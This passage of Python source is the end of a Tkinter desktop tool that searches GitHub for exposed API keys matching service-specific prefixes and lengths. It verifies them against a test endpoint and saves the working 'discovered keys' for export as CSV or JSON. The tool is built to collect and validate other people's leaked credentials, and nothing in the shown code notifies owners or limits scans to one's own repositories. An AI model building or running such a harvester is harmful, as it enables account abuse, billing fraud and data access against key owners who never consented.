                    save_presets(self.presets)
                    self.service_menu['values'] = list(self.presets.keys())
                    lb.delete(0, tk.END)
                    for p in self.presets: lb.insert(tk.END, p)

        btn_container = tk.Frame(form_frame, bg=COLORS["bg"])
        btn_container.pack(fill=tk.X, pady=20)
        
        tk.Button(btn_container, text="SAVE CONFIGURATION", bg=COLORS["success"], fg=COLORS["bg"], font=FONTS["sub_header"], bd=0, padx=15, pady=8, command=save_preset_btn).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_container, text="DELETE", bg=COLORS["danger"], fg="white", font=FONTS["sub_header"], bd=0, padx=15, pady=8, command=delete_preset_btn).pack(side=tk.LEFT, padx=5)

    def handle_action_btn(self):
        if self.is_running:
            self.stop_scan()
        else:
            self.start_scan()

    def start_scan(self):
        service = self.service_var.get()
        pages = self.pages_var.get()
        
        if not pages.isdigit():
            messagebox.showerror("Input Error", "Page depth must be an integer.")
            return

        # Clear console for new scan
        self.console.configure(state='normal')
        self.console.delete('1.0', tk.END)
        self.console.configure(state='disabled')

        self.is_running = True
        self.start_btn.configure(text="CANCEL SCAN", bg=COLORS["danger"])
        self.status_indicator.configure(text="SCANNING IN PROGRESS", fg=COLORS["warning"])
        
        thread = threading.Thread(target=self.run_scanner_thread, args=(service, int(pages)))
        thread.daemon = True
        thread.start()

    def stop_scan(self):
        if self.current_scanner:
            self.current_scanner.stop_requested = True
            print("\n[!] Cancellation requested. Finishing current task...")
            self.start_btn.configure(state='disabled')

    def run_scanner_thread(self, service, pages):
        preset = self.presets[service]
        paths = DEFAULT_FILE_PATHS
        syns = preset.get('synonyms', DEFAULT_SYNONYMS)
        target_url = f"https://github.com/search?q={paths}+AND+{syns}+AND+{preset['keywords']}{SEARCH_SUFFIX}"
        
        config = {
            "target_url": target_url, "prefix": preset["prefix"], "length": preset["length"],
            "test_url": preset["test_url"], "method": preset.get("method", "POST"),
            "payload": preset.get("payload"), "custom_headers": preset.get("custom_headers"),
            "results_file": f"{service}_keys.txt", "pages": pages,
            "interactive": not self.headless_var.get()
        }

        self.current_scanner = APIScanner(config)
        asyncio.run(self.current_scanner.run())
        
        self.root.after(0, self.on_scan_complete)

    def on_scan_complete(self):
        self.is_running = False
        self.start_btn.configure(text="INITIATE SCAN", bg=COLORS["accent"], state='normal')
        self.status_indicator.configure(text="SYSTEM READY", fg=COLORS["success"])
        if self.current_scanner and self.current_scanner.stop_requested:
            messagebox.showinfo("Aborted", "The operation was successfully cancelled.")
        else:
            messagebox.showinfo("Operation Complete", "The scan and verification cycle has finished successfully.")

    def show_download_options(self):
        # Position menu below button
        try:
            x = self.download_btn.winfo_rootx()
            y = self.download_btn.winfo_rooty() + self.download_btn.winfo_height()
            self.download_menu.post(x, y)
        except Exception as e:
            self.download_results("text")

    def download_results(self, format_type):
        service = self.service_var.get()
        source_file = f"{service}_keys.txt"
        
        if not os.path.exists(source_file):
            messagebox.showwarning("Data Unavailable", "No results found for this selection yet.")
            return
            
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
        
        try:
            # Parse existing data
            data_rows = []
            with open(source_file, "r") as f:
                for line in f:
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3:
                        data_rows.append({"key": parts[0], "status": parts[1], "date": parts[2]})

            if format_type == "excel":
                dest_file = f"{service}_keys_export.csv"
                dest_path = os.path.join(downloads_path, dest_file)
                import csv
                with open(dest_path, "w", newline='') as cf:
                    writer = csv.DictWriter(cf, fieldnames=["key", "status", "date"])
                    writer.writeheader()
                    writer.writerows(data_rows)
                messagebox.showinfo("Excel Ready", f"CSV for Excel saved to Downloads:\n{dest_file}")
            
            elif format_type == "array":
                dest_file = f"{service}_keys_array.txt"
                dest_path = os.path.join(downloads_path, dest_file)
                keys_only = [row["key"] for row in data_rows]
                with open(dest_path, "w") as af:
                    af.write(json.dumps(keys_only, indent=4))
                messagebox.showinfo("Array Ready", f"JSON Array saved to Downloads:\n{dest_file}")
            
            else: # Standard text
                dest_path = os.path.join(downloads_path, source_file)
                shutil.copy2(source_file, dest_path)
                messagebox.showinfo("Download Complete", f"Standard log saved to Downloads:\n{source_file}")

        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export file: {e}")

    def clear_results(self):
        service = self.service_var.get()
        filename = f"{service}_keys.txt"
        
        if not os.path.exists(filename):
            messagebox.showinfo("Nothing to Clear", f"No data file found for {service}.")
            return
            
        if messagebox.askyesno("Confirm Deletion", f"Permanently delete all discovered keys for '{service}'?\nThis action cannot be undone."):
            try:
                os.remove(filename)
                print(f"[*] Cleared all historical data for {service}.")
                messagebox.showinfo("Success", f"Data for {service} has been successfully purged.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete data: {e}")

    def open_api_tester(self):
        # We don't use absolute path to "index.html" anymore, 
        # we generate a temporary tester file from the embedded string.
        try:
            temp_dir = tempfile.gettempdir()
            tester_path = os.path.join(temp_dir, "antigravity_tester.html")
            
            with open(tester_path, "w", encoding="utf-8") as f:
                f.write(INTERNAL_TESTER_HTML)
                
            webbrowser.open(f"file://{tester_path}")
        except Exception as e:
            messagebox.showerror("Tester Error", f"Failed to generate or open the embedded tester: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    # Attempt to set a more modern font if Inter is not available
    try:
        from tkinter import font
        if "Inter" not in font.families():
            FONTS["header"] = ("Helvetica", 24, "bold")
            FONTS["sub_header"] = ("Helvetica", 11, "bold")
            FONTS["body"] = ("Helvetica", 10)
    except: pass
    
    app = ScannerGUI(root)
    root.mainloop()
